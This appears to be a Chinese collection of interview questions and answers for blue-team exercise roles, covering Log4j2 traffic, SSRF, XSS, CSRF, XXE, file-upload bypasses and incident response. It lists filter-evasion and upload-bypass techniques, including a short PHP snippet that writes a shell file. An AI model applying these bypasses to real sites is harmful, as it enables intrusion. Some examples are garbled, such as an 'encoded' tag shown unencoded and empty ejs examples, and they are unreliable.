# 护网行动面试题

这些题目中有自己的面试和网上找到的一些面经。

## 电话面

### Log4J2的流量特征？
Log4j是一个常用的Java日志框架，而与Log4j相关的攻击主要是基于Log4j 2.x 中的漏洞，攻击者通过该漏洞可以在目标服务器上执行任意代码，因此对应的流量特征主要是以下几个方面：
1. DNS解析异常：攻击者可能会通过Log4j漏洞利用DNS查询，以便向恶意服务器发送请求。因此，在DNS查询中可能会出现异常解析请求，例如请求的域名为一串随机字符，或者请求的域名包含非常规字符等。
2. HTTP/HTTPS请求异常：攻击者可能会利用Log4j漏洞向恶意服务器发送HTTP/HTTPS请求，并在请求中注入恶意代码。因此，在网络流量中可能会出现异常的HTTP/HTTPS请求，例如请求的URL包含异常字符或者非常规路径，请求的响应状态码不正常（如404、500等），或者请求的响应内容包含异常字符等。
3. 反向Shell连接：攻击者可能会利用Log4j漏洞建立反向Shell连接，以便在目标服务器上执行命令并获取敏感信息。因此，在网络流量中可能会出现异常的TCP连接，例如目标服务器向外部恶意服务器建立连接，或者恶意服务器向目标服务器建立连接等。
4. 异常的日志记录：攻击者利用Log4j漏洞可能会在目标服务器上记录异常的日志信息，例如日志信息中包含异常的字符或者命令注入等，或者日志信息的格式和内容与正常的日志信息不匹配等。
如果发现以上异常流量特征，应该考虑系统是否存在Log4j漏洞，并及时采取相应的应急响应措施。

### Windows系统中隐藏用户的排查。
在 Windows 操作系统中，隐藏账户可能会成为安全漏洞。如果您需要排查隐藏账户，可以按照以下步骤操作：
1. 打开“计算机管理”控制台：可以通过在开始菜单中搜索“计算机管理”或者右键点击“计算机”图标，选择“管理”来打开“计算机管理”控制台。
2. 打开“本地用户和组”：在“计算机管理”控制台中，展开“系统工具”和“本地用户和组”，然后选择“用户”。
3. 检查用户列表：在“用户”列表中，查看是否有任何隐藏的用户账户。隐藏的账户通常是通过修改注册表等方式来隐藏的，因此可能不会在常规的用户列表中显示。
4. 使用命令行工具：您还可以使用命令行工具来查找隐藏的账户。打开命令行窗口，输入“net user”命令，然后查看是否有任何隐藏账户。
5. 检查注册表：隐藏账户可能是通过修改注册表来实现的。打开注册表编辑器，然后检查以下路径中的账户列表：
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
   如果在该路径下找到任何隐藏账户，请将其删除或禁用。
请注意，如果您不熟悉 Windows 操作系统的配置和管理，最好在进行任何更改之前备份系统或咨询专业人员。

### 说说SSRF漏洞原理。

SSRF（Server Side Request Forgery）漏洞是一种常见的Web应用程序安全漏洞，攻击者可以利用该漏洞让服务器端发起网络请求，包括本地网络和外部互联网，从而实现攻击目标。

SSRF漏洞的原理是攻击者能够在Web应用程序中控制请求的URL或参数，使服务器端发起的请求指向攻击者指定的目标地址，而不是原本预期的目标地址。攻击者可以利用这个漏洞进行以下攻击：

1. 访问内部系统：攻击者可以发送请求到内部系统，以获取敏感信息或者执行未授权操作。
2. 探测内部网络：攻击者可以发送请求到内部网络，以扫描网络拓扑和端口，发现其他攻击目标。
3. 攻击外部系统：攻击者可以发送请求到外部系统，以攻击其他系统或者进行恶意操作。

攻击者可以利用多种方式实现SSRF漏洞攻击，例如通过修改请求中的URL或参数，利用服务器端的解析漏洞、重定向漏洞或者文件包含漏洞等。

为防止SSRF漏洞的发生，应用程序可以采取以下措施：

1. 接受白名单：限制Web应用程序发起请求的目标地址，只允许请求指定的白名单内的地址。
2. 使用安全协议：限制Web应用程序发起请求的协议，只允许使用HTTPS等安全协议。
3. 检测和阻止重定向：检测和阻止Web应用程序中的重定向功能，避免攻击者通过重定向协议实现攻击。
4. 防范文件包含漏洞：对于可以包含外部文件的参数，进行严格的输入验证和过滤，避免攻击者利用文件包含漏洞实现攻击。

需要注意的是，SSRF漏洞具有隐蔽性和危害性，攻击者可能会利用该漏洞窃取敏感信息或者控制服务器进行攻击。因此，建议Web应用程序开发者和管理员加强安全防护，加强漏洞扫描和安全测试，及时修补漏洞。

### ⭐XSS的原理和类型？绕过方法？

XSS（跨站脚本攻击）是一种常见的Web应用程序攻击，攻击者通过在Web页面中注入恶意脚本，来窃取用户的敏感信息或执行非法操作。下面是XSS的原理、类型以及绕过方法：

原理：XSS攻击的原理是利用Web应用程序对用户输入的信任，将恶意脚本嵌入到Web页面中。当用户访问包含恶意脚本的页面时，恶意脚本将会执行，从而实现攻击者的目的。

主要类型：XSS攻击可以分为以下三种类型：

- 存储型XSS攻击：攻击者将恶意脚本存储到Web应用程序的数据库中，当其他用户访问包含恶意脚本的页面时，恶意脚本将会执行。
- 反射型XSS攻击：攻击者将恶意脚本作为参数发送给Web应用程序，Web应用程序将恶意脚本反射到响应页面中，当用户访问包含恶意脚本的页面时，恶意脚本将会执行。
- DOM型XSS攻击：攻击者将恶意脚本嵌入到Web页面中，当用户访问包含恶意脚本的页面时，恶意脚本将会修改页面的DOM结构，从而实现攻击者的目的。

绕过方法：为了绕过XSS防御措施，攻击者可以采用以下方法：

- 编码：攻击者可以使用HTML编码或URL编码来绕过对输入内容的过滤和验证。例如，攻击者可以使用`<script>`标签的HTML编码`<script>`来绕过过滤。

- 混淆：攻击者可以利用Unicode字符集中的字符、HTML标签属性、JavaScript语法等方法来混淆恶意脚本，从而绕过过滤和验证。
- 利用事件：攻击者可以在Web页面中注入恶意脚本，并利用事件触发器（如onclick、onload等）来触发恶意脚本执行。
- 双写绕过、大小写转换、引号使用、用 / 代替空格。

为了**预防XSS攻击**，Web应用程序应该对用户输入进行过滤和验证，避免恶意脚本的注入。同时，Web应用程序还可以采用以下措施来保护用户：

- **对用户输入的内容进行过滤**，可以使用HTML编码或URL编码来过滤掉一些非法字符和标签。
- **使用 HttpOnly Cookie**，如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样可以有效的防止XSS攻击窃取cookie。
- **设置X-XSS-Protection属性**，该属性被所有的主流浏览器默认开启。X-XSS-Protection，即XSS保护属性，是设置在响应头中目的是用来防范XSS攻击的。在检查到XSS攻击时，停止渲染页面。
- 开启CSP网页安全策略，在Web应用程序中启用CSP（Content Security Policy）来限制页面可以加载的资源和执行的脚本，从而减少XSS攻击的风险。开启CSP策略后可以起到以下作用：禁止加载外域代码，防止复杂的攻击逻辑；禁止外域提交，网站被攻击后，用户的数据不会泄露到外域；禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）；禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。合理使用上报可以及时发现 XSS，利于尽快修复问题。
- **避免内联事件**：尽量不要使用 onLoad=“onload(’{{data}}’)”、onClick=“go(’{{action}}’)” 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。
- **使用模板引擎**：开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 而不是 ； 在 doT.js 中，尽量使用 {{! data } 而不是 {{= data }； 在 FreeMarker 中，确保引擎版本高于 2.3.24。
- 对于包含用户输入的动态内容，应该使用合适的输出编码（如HTML编码、JavaScript编码等）来避免恶意脚本的注入。

**XSS的危害**：

- 窃取cookie
- 抓取屏幕截图
- 获取键盘记录
- 重定向
- 植入广告，恶意链接
- 网页钓鱼
- 网页挂马
- 结合网页挂马或者其他工具(Metasploit)获取服务器或者操作系统权限

### XSS和CSRF的组合攻击？

XSS（跨站脚本攻击）和CSRF（跨站请求伪造攻击）都是常见的Web应用程序攻击，可以独立进行攻击，也可以结合起来进行攻击。

**在XSS攻击中，攻击者通过在Web应用程序中注入恶意脚本，来窃取用户的敏感信息或执行非法操作。而在CSRF攻击中，攻击者通过伪造用户的身份，来执行用户没有意愿执行的非法操作。**

当两种攻击结合起来时，攻击者可以通过XSS攻击获取用户的身份信息，然后使用CSRF攻击来执行非法操作。具体攻击流程如下：

1. 攻击者在Web应用程序中注入恶意脚本，获取用户的身份信息。
2. 攻击者使用获取到的用户身份信息，构造伪造请求，来执行非法操作。伪造请求中包含了用户的身份信息，因此Web应用程序无法区分伪造请求和用户的真实请求。
3. 当用户访问包含恶意脚本的页面时，恶意脚本将会执行，并将用户的身份信息发送给攻击者。攻击者使用这些信息来执行伪造请求。

通过XSS和CSRF的组合攻击，攻击者可以绕过Web应用程序的验证和授权机制，执行非法操作。为了防止这种攻击，Web应用程序需要采取一些措施，例如：

1. 对用户输入进行过滤和验证，避免XSS攻击。
2. 在每个请求中包含一个随机的令牌，以验证请求的合法性，避免CSRF攻击。
3. 使用HTTPS协议，保护用户的身份信息不被窃取。

综上所述，XSS和CSRF的组合攻击可以绕过Web应用程序的验证和授权机制，对用户的信息和资产造成严重威胁。

### ⭐CSRF漏洞原理、类型、危害？

CSRF（跨站请求伪造攻击）是一种常见的Web应用程序攻击，攻击者利用用户已经登录的身份，在用户不知情的情况下，向Web应用程序发送恶意请求。下面是CSRF漏洞的原理、类型和危害：

原理：CSRF攻击的原理是攻击者利用用户在Web应用程序中的登录状态，向Web应用程序发送伪造请求。攻击者可以通过诱使用户点击恶意链接、注入恶意代码等方法，来触发CSRF攻击。

类型：CSRF攻击可以分为以下两种类型：

- GET型CSRF：攻击者通过构造伪造的GET请求，来执行非法操作。例如，攻击者可以在图片URL中嵌入恶意代码，当用户访问包含恶意代码的页面时，恶意代码将会向Web应用程序发送GET请求。
- POST型CSRF：攻击者通过构造伪造的POST请求，来执行非法操作。例如，攻击者可以在恶意网站上伪造表单，当用户填写表单并提交时，恶意代码将会向Web应用程序发送POST请求。

危害：CSRF攻击对Web应用程序的安全造成了严重的威胁，可能导致以下危害：

- 窃取用户敏感信息：攻击者可以通过CSRF攻击，向Web应用程序发送恶意请求，来窃取用户的敏感信息，例如密码、账号等。
- 修改用户数据：攻击者可以通过CSRF攻击，向Web应用程序发送恶意请求，来修改用户的数据，例如将用户账户余额转移到攻击者的账户中。
- 执行非法操作：攻击者可以通过CSRF攻击，向Web应用程序发送恶意请求，来执行非法操作，例如删除用户数据、发布垃圾内容等。

为了预防CSRF攻击，Web应用程序可以采用以下措施：

- **验证码验证**：验证码是对抗CSRF攻击最简洁而有效的防御方法。CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，对用户执行敏感操作时进行验证，就能够很好地遏制CSRF攻击。但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。
- **在请求地址中添加 token 并验证**：CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以**在每个HTTP 请求中以参数的形式加入一个随机产生的 token**以验证请求的合法性，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
- **验证 HTTP头的Referer 字段**：通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。
- 对用户输入进行过滤和验证，避免恶意代码的注入。
- 禁止使用GET请求进行敏感操作。
- 使用CORS（跨域资源共享）来限制跨域请求，避免跨站点攻击。

综上所述，CSRF攻击对Web应用程序的安全造成了严重的威胁，Web应用程序需要采取有效的措施来预防和防御CSRF攻击。

### ⭐SSRF漏洞原理，绕过手法？

SSRF（服务器端请求伪造攻击）是一种常见的Web应用程序漏洞，攻击者可以利用该漏洞来发起攻击，例如窃取内网数据、攻击第三方服务等。下面是SSRF漏洞的原理和绕过手法：

原理：SSRF攻击的原理是攻击者可以构造恶意请求，利用Web应用程序对URL的处理不当，使得Web应用程序向攻击者指定的URL发起请求。攻击者可以通过构造恶意请求，来窃取内网数据、攻击第三方服务等。

为了绕过SSRF防御措施，攻击者可以采用以下**绕过方法**：

- **利用@绕过限制白名单域名**，当网站限制只能访问 http://www.xxx.com类型的域名时，**可以采用http基本身份认证的方式绕过**，如：http://www.xxx.com@www.xxc.com
- **绕过限制白名单内网IP**，采用302跳转，**绕过限制请求http协议**
- 攻击外部服务：攻击者可以将恶意请求发送给可公开访问的服务，例如DNS、SMTP等，从而绕过对内网地址的限制。
- 利用协议：攻击者可以利用一些特殊协议，例如file://、dict://等，来访问本地文件、远程信息等。
- URL编码：攻击者可以使用URL编码来绕过对特殊字符的过滤和验证，从而构造恶意请求。
- 绕过限制：攻击者可以利用Web应用程序的漏洞，来绕过SSRF防御措施，例如利用URL重定向、URL跳转等漏洞。

为了预防SSRF攻击，Web应用程序可以采取以下措施：

- 过滤和验证用户输入，避免恶意URL的注入。
- 禁止Web应用程序向私有地址、本地地址和公网地址发起请求。
- 对于必须访问外部服务的情况，应该使用白名单限制可访问的URL。
- 对于URL中包含的特殊字符，应该进行过滤和验证，避免攻击者利用URL编码等手法绕过防御措施。

**SSRF漏洞经常存在的位置**：

- 分享：通过URL地址分享网页内容

- 转码服务

- 在线翻译

- 图片加载与下载：通过URL地址加载或下载图片

- 图片、文章收藏功能

- 未公开的api实现以及其他调用URL的功能

### ⭐XXE漏洞原理、危害？如何构建XXE漏洞攻击？如何防范？

XXE (XML External Entity) 漏洞是一种常见的Web应用程序安全漏洞，攻击者利用该漏洞可以读取服务器上的敏感数据、执行任意代码等。下面是XXE漏洞的原理、危害，以及如何构建XXE漏洞攻击和防范：

1. 原理：XXE漏洞的原理是攻击者利用Web应用程序对XML文件的解析不当，通过注入恶意的XML内容，来读取服务器上的敏感数据或执行任意代码。攻击者通常会构造一个带有恶意XML实体的XML文档，当Web应用程序解析该XML文档时，恶意实体将会被解析并执行。
2. 危害：XXE漏洞对Web应用程序的安全造成了严重的威胁，可能导致以下危害：

- 读取敏感数据：攻击者可以通过XXE漏洞，读取服务器上的敏感数据，例如配置文件、密码等。
- 执行任意代码：攻击者可以通过XXE漏洞，执行任意代码，例如向其他系统发起攻击、篡改数据等。
- 拒绝服务攻击：攻击者可以通过XXE漏洞，向服务器发送大量的恶意请求，从而导致服务器崩溃。

1. 构建XXE漏洞攻击：攻击者可以通过以下方式，构建XXE漏洞攻击：

- 在XML文档中注入恶意实体
- 利用外部实体引用（External Entity References）来执行任意代码
- 利用DTD（Document Type Definition）来构造恶意XML文档

1. 防范XXE漏洞：Web应用程序可以采用以下措施，来防范XXE漏洞：

- 禁用实体解析（Disable Entity Resolution）：Web应用程序应该禁用实体解析，避免攻击者注入恶意实体。
- 使用白名单（Use a whitelist）：Web应用程序应该使用白名单来限制可接受的XML数据。只有符合白名单规则的XML数据才能被接受和解析。
- 使用安全的XML解析器（Use a secure XML parser）：Web应用程序应该使用安全的XML解析器，避免解析XML文档时发生漏洞。
- 移除不必要的DTD（Remove unnecessary DTDs）：Web应用程序应该移除不必要的DTD，避免攻击者利用DTD来构造恶意XML文档。

综上所述，XXE漏洞对Web应用程序的安全造成了严重的威胁，Web应用程序需要采取有效的措施来预防和防御XXE漏洞。攻击者可以通过注入恶意实体、利用外部实体引用和利用DTD来构建XXE漏洞攻击。Web应用程序可以通过禁用实体解析、使用白名单、使用安全的XML解析器和移除不必要的DTD等措施，来防范XXE漏洞。

### 文件上传漏洞的绕过手法？

**前端JS禁用绕过**

在前端页面禁用JS，当然也有可能影响正常页面显示却没用

**简单修改后缀名绕过**

如果只是前端页面限制上传的文件后缀名，那么我们就可以利用burp suite等工具修改文件后缀名绕过。

**抓包修改MIME类型**

常见图片MIME类型: image/gif, image/png, image/jpeg, image/bmp, image/webp, image/x-icon, image/vnd.microsoft.icon

服务端代码是通过Content-Type的值来判断文件的类型，这样我们可以直接对文件的Content-Type值进行修改来绕过。

**后缀名大小写绕过**

如果源代码没有对文件后缀名进行大小写转换，那么只要更改文件名后缀大小写即可绕过黑名单

**图片马绕过**

使用edjpgcom等工具或者命令将图片和WebShell制作成一个图片马

**GIF89a图片头文件欺骗**

比如GIF89a，在webshell前面加上GIF89a，后台认为是图片,上传后再执行木马，更有效的做法是结合其他绕过方法更有针对性的绕过。

**%00，0x00截断** 

比如修改文件名为  1.php%00.jpg，如果php 版本<5.3.4   在url中%00表示ascll码的0 ，而ascii码的0，表示字符串结束，所以当url中出现%00时就会认为读取已结束，最后会被解析为  1.php，从而实现绕过

 **.htaccess文件绕过** 

.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

比如说在htaccess文件中有如下内容

AddType application/x-httpd-php .png   那我们随后上传png后缀图片马即可绕过

 **.user.ini.绕过**

.user.ini文件里的意思是：所有的php文件都自动包含指定的文件，比如说某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。

**条件竞争绕过**

一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含webshell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作)，攻击者可以利用这个短的时间差完成条件竞争的上传漏洞攻击。比如上传一个php文件里面这样写

```text
<?php 
    fputs(fopen('../shell.php','w'),'');
?>
```

**::$DATA绕过**

在php代码中没有对::$DATA进行过滤，在windows中会将文件名::$DATA之后的数据当成文件流处理，保持::$DATA之前的文件名
假设上传的文件为test9.php::$DATA.jpg，如果成功上传到服务器就会去掉::$DATA.jpg变成test9.php进行保存
但是php代码中还通过strrchr函数获取文件后缀.jpg，并以该后缀作为上传之后的文件后缀
所以test9.php::$DATA.jpg上传到服务器后缀仍然是.jpg

**+空格+点绕过**

某些情况下，源代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过

**后缀名双写绕过**

黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过，比如1.pphphp,后端源代码过滤掉红色标注部分，剩余1.php。

**特殊可解析后缀绕过**

源代码有黑名单限制，那么我们就可以修改文件后缀名为根据后端的脚本语言能够解析的文件后缀，比如源代码是用php语言写的话，1.php1会被解析为1.php。PhP除了可以解析php后缀 还可以解析php1,php2，php3，php4 ，phtml等。Asp可解析 asa，cer,cdx。Aspx可解析 ashx，asmx，ascx。Jsp可解析jspx、jspf

------

**文件上传漏洞的危害？**

上传webshell,控制服务器、远程命令执行。上传系统病毒、木马文件进行挖矿、僵尸网络。进行提权操作。修改web页面，实现钓鱼、挂马等操作。进行内网渗透。

**文件上传功能的监测点有哪些？**

客户端的JS检测（主要检测文件名后缀）

服务端检测（MINE类型检测、文件后缀名、文件格式头）

#### **文件上传漏洞的防范措施有哪些？**

**文件上传的目录设置为不可执行**

只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。

**严格判断文件类型**

在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。

**使用随机数修改文件名和文件路径**

文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。

**单独设置文件服务器的域名**

由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。

**内容检测**

有效防范图片马和文件二次渲染

**安全加固中间件**

及时更新并加固中间件，可以有效避免因为中间件的漏洞而导致的文件上传漏洞，比如某些中间件以前的版本很多都具有文件解析漏洞

**采用WAF等安全防护设备** 

采用WAF等安全防护设备可以有效的防御常见漏洞。

#### **常见的未授权访问漏洞有哪些？**

- MongoDB未授权访问漏洞

- Redis未授权访问漏洞

- Memcached未授权访问漏洞

- JBOSS未授权访问漏洞

- VNC未授权访问漏洞

- Docker未授权访问漏洞

- ZooKeeper未授权访问漏洞

- Rsync未授权访问漏洞

### SQL注入中导致报错注入的注入函数有哪些？

```bash
updatexml()
extractvalue()
floor()
exp()       
```

### 应急响应的流程？

 收集信息：由安全设备收集主机，样本信息，以及一些客户信息。

 判断类型：是否是安全事件？具体为什么安全事件？挖矿？DOS？等。

 深入分析：从系统角度深入分析，日志，进程，启动项这些去分析。

 清理处置：杀掉异常进程，删除异常文件，打补丁或者修复相关文件等。

 产出报告：对此次安全事件进行一个完整的文档描述。

### 怎么寻找红队留下的痕迹？

寻找红队留下的痕迹是蓝队应对安全攻击的重要工作。以下是一些常见的寻找红队留下的痕迹的方法：

- 分析系统日志：系统日志通常记录了系统的各种活动，包括登录、文件操作、网络连接等。检查网络设备、服务器和应用程序的日志，可以发现不寻常的活动，例如从未见过的IP地址登录、异常的文件操作、异常的登录尝试、流量模式或其他不寻常的活动。
- 主机分析：检查受攻击的计算机上的日志和文件系统，查找异常的进程、文件、注册表项、服务或其他活动。
- 内存分析：对受攻击的计算机进行内存捕获，并使用专业工具进行分析，查找任何与攻击相关的进程、线程、连接等。
- 检查网络流量：红队攻击通常会产生异常的网络流量。使用网络流量分析工具捕获网络流量，可以发现异常的连接、异常的数据包等，并查找异常的流量模式、未知的通信协议或其他不寻常的活动。
- 检查系统文件：红队攻击通常会在系统中留下一些文件，例如恶意软件、后门程序等。通过检查系统文件，可以发现异常的文件和程序。对发现的任何恶意代码进行深入分析，了解其功能、行为和攻击方式。
- 检查系统配置：红队攻击通常会修改系统配置，以便维持访问权限等。通过检查系统配置，可以发现异常的配置项和设置。
- 使用安全监控工具：安全监控工具可以帮助蓝队检测系统中的异常活动，例如入侵检测系统（IDS）、入侵防御系统（IPS）等。这些工具可以监控网络流量、系统日志、系统配置等，以便及时发现和应对红队攻击。

需要注意的是，红队攻击通常采用隐蔽、持久的方式进行，留下的痕迹可能非常微小，或者伪装成正常的系统活动。因此，蓝队需要综合运用多种方法，对系统进行全面的检查和分析，以便及时发现和应对红队攻击。同时，蓝队也需要及时更新系统补丁、加强系统安全配置、加强用户培训等措施，以提高系统的安全性。

### ⭐流量分析？

流量分析（Traffic Analysis）是一种对网络流量进行分析的技术，用于检测和诊断网络问题、应对安全攻击等。流量分析可以帮助网络管理员了解网络中的数据流动情况，发现网络中的异常活动和潜在风险，以便及时采取措施应对。

流量分析通常包括以下步骤：

1. 捕获数据包：流量分析工具可以通过网络接口捕获网络数据包，以便对数据包进行分析。
2. 过滤数据包：流量分析工具可以根据不同的条件对数据包进行过滤，例如过滤出特定的IP地址、端口号、协议等。
3. 分析数据包：流量分析工具可以对数据包进行详细的分析，包括源IP地址、目的IP地址、源端口、目的端口、协议类型、数据内容等。
4. 可视化数据包：流量分析工具可以将数据包进行可视化，例如绘制流程图、统计图表等，以便更直观地了解网络流量情况。

流量分析可以应用于多种场景，例如：

1. 诊断网络问题：流量分析可以帮助网络管理员诊断网络问题，例如网络延迟、丢包等，以便及时采取措施解决问题。
2. 应对安全攻击：流量分析可以帮助网络管理员发现网络中的异常活动，例如DDoS攻击、恶意软件传播等，以便及时采取措施应对。
3. 监控网络性能：流量分析可以帮助网络管理员了解网络的负载情况、带宽利用率等，以便优化网络性能。

需要注意的是，流量分析需要进行大量的数据处理和分析，需要使用专业的流量分析工具，例如Wireshark、tcpdump等。同时，流量分析也需要具备一定的网络知识和技能，以便进行准确的数据分析和处理。

### ⭐态势感知？

态势感知（Situational Awareness）是指对环境中的各种信息进行收集、处理、分析、评估和决策的能力。在网络安全领域，态势感知是指对网络中的各种攻击、威胁和异常活动进行实时监控和分析，以便及时发现和应对安全事件。

态势感知通常包括以下几个阶段：

1. 收集信息：态势感知需要收集来自各种渠道的信息，例如网络设备日志、安全监控工具输出等。这些信息可以帮助了解网络中的各种活动和事件。
2. 处理信息：态势感知需要对收集到的信息进行处理，例如去除冗余信息、归类信息、提取关键信息等。这些信息可以帮助快速识别和定位安全事件。
3. 分析信息：态势感知需要对处理后的信息进行分析，例如检测异常活动、识别攻击模式、评估安全风险等。这些信息可以帮助快速响应和应对安全事件。
4. 评估信息：态势感知需要对分析结果进行评估，例如确定事件的优先级、决定是否需要采取措施等。这些信息可以帮助及时响应和防范安全事件。
5. 决策执行：态势感知需要根据评估结果，制定合理的安全措施，例如强化网络安全配置、加强用户培训、修补漏洞等。这些措施可以帮助提高网络安全性和减少安全风险。

态势感知在网络安全领域中具有重要的作用。通过实时监控和分析网络中的各种活动和事件，可以及时发现和应对安全威胁，降低安全风险，提高网络安全性和稳定性。

#### 态势感知产品：

- 360态势感知：由中国著名安全厂商360推出的产品，主要提供网络威胁查询、漏洞扫描、流量分析等功能，同时集成了各种安全情报和指标，可以为用户提供全面的安全态势分析和预警服务。

- 腾讯云安全大脑：由腾讯云推出的产品，利用 AI、机器学习等技术对攻击进行实时监测和分析，提供包括漏洞扫描、风险评估、异常检测等一系列安全服务。

- 云锁事件响应中心：由阿里云推出的产品，提供网络空间威胁和安全事件的监测、预警、应急响应等服务。该产品采用 AI 算法进行态势感知，并可以自动化响应安全事故。

- 北京赛迪态势感知系统：由北京赛迪安全科技股份有限公司开发的产品，支持网络威胁情报搜集、风险事件自动识别、威胁行为关联分析等功能，可为企业提供全生命周期的网络安全保护。

- 启明星辰安全态势感知：由启明星辰推出的产品，提供整体安全态势感知、针对性攻击检测、应急响应等功能，可帮助用户实现从被动防御到主动防御的转变。

这些产品都采用了先进的机器学习和人工智能技术，可以自动化地分析和识别网络威胁，并及时发出预警或者采取应急措施。同时，这些产品还具备可视化的操作界面，用户可以通过简单的操作就可以了解整个系统的安全情况，并做出相应的决策

### 如果已经被红队攻陷了该怎么办？

如果已经被红队攻陷了，需要立即采取以下措施应对：

1. 隔离受攻击的系统：立即隔离被攻击的系统，以防止攻击向其他系统扩散。
2. 停止攻击：尝试停止攻击，例如关闭恶意程序、断开网络连接等。
3. 收集证据：收集攻击的证据，例如攻击流量、攻击日志等，以便后续的分析和调查。
4. 进行紧急响应：根据攻击的性质，采取紧急响应措施，例如修补漏洞、清除恶意软件、修改密码等。
5. 恢复受损系统：对受攻击的系统进行恢复和重建，例如重新安装操作系统、恢复备份数据等。
6. 进行安全审计：对系统进行安全审计，检查是否存在其他安全隐患或后门程序等，以确保系统的安全性。
7. 提高安全意识：加强用户培训和安全意识教育，提高用户的安全防范意识，减少类似事件的发生。

在应对红队攻击时，需要采取快速、果断的措施，以便尽快恢复系统的正常运行，并防止类似事件的再次发生。同时，也需要对事件进行详细的分析和调查，以便了解攻击的性质、攻击者的目的和手段，从而进一步提高系统的安全性。

### ⭐网络流量特征分析

蓝队通常需要对网络流量进行特征分析，以发现网络中的异常流量或潜在的安全威胁。常见的流量特征分析方法如下：

1. 流量基线分析：首先需要建立网络流量的基线，即正常的流量模式。可以使用一些流量监控工具，例如Wireshark、tcpdump、tshark等，对网络流量进行捕获和分析，以建立基线。基于基线，可以通过对比实时流量和基线数据，发现异常流量或活动。
2. 端口和协议分析：对网络中使用的端口和协议进行分析，可以发现一些异常活动。例如，如果某个端口在短时间内被大量使用，可能是某种攻击行为。如果发现使用了非常规的协议，例如Tor、SSH等，也可能表示存在异常活动。
3. 数据包大小和频率分析：分析数据包的大小和频率，可以发现一些异常的流量。例如，如果数据包的大小超出了正常范围，或者频率异常高，可能是某种攻击行为，例如DDoS攻击。
4. 流量来源和去向分析：对流量的来源和去向进行分析，可以发现潜在的安全威胁。例如，如果某个IP地址频繁访问公司的核心业务系统，可能是潜在的攻击者。如果某个系统频繁向外网发送数据，可能是潜在的数据泄露行为。
5. 应用层协议分析：对应用层协议进行分析，可以发现一些异常行为。例如，如果发现了大量的SQL注入攻击，可能是某个应用程序存在漏洞。如果发现了大量的文件上传行为，可能是某个系统存在文件上传漏洞。

在进行流量特征分析时，需要使用一些专业的分析工具，例如Zeek、Snort、Suricata等，以尽可能准确地发现异常流量和潜在的安全威胁。同时，需要对分析结果进行综合分析，结合其他安全事件和威胁情报，进行相应的响应和处置。

Wireshark是一款流量分析工具，可以帮助蓝队对网络流量进行特征分析，以发现网络中的异常流量或潜在的安全威胁。Wireshark常见的流量特征分析方法如下：

1. 捕获流量：首先需要使用Wireshark对网络流量进行捕获。可以选择捕获整个网络流量，也可以选择捕获特定的IP地址、端口或协议的流量。
2. 过滤流量：Wireshark可以使用过滤器来过滤流量。可以使用预设的过滤器，例如过滤特定协议的流量，也可以自定义过滤器，例如过滤特定IP地址或端口的流量。
3. 分析协议：Wireshark可以对捕获的流量进行协议分析。可以使用Wireshark预设的协议解码器，例如HTTP、FTP等，也可以使用自定义的协议解码器，例如SIP、MQTT等。
4. 分析流量统计信息：Wireshark可以提供流量的统计信息，例如流量大小、数据包数量、数据包大小分布、数据包延迟等信息。这些信息可以帮助蓝队发现异常流量。
5. 分析数据包细节：Wireshark可以提供数据包的详细信息，例如源IP地址、目标IP地址、源端口、目标端口、数据包内容等。这些信息可以帮助蓝队发现异常流量或潜在的安全威胁。

需要注意的是，Wireshark只是一个流量分析工具，对于复杂的网络流量分析，需要有一定的专业知识和经验。同时，在进行流量分析时，需要使用一些专业的分析工具，例如Zeek、Snort、Suricata等，以尽可能准确地发现异常流量和潜在的安全威胁。同时，需要对分析结果进行综合分析，结合其他安全事件和威胁情报，进行相应的响应和处置。

#### 怎么区分爬虫流量和攻击流量？

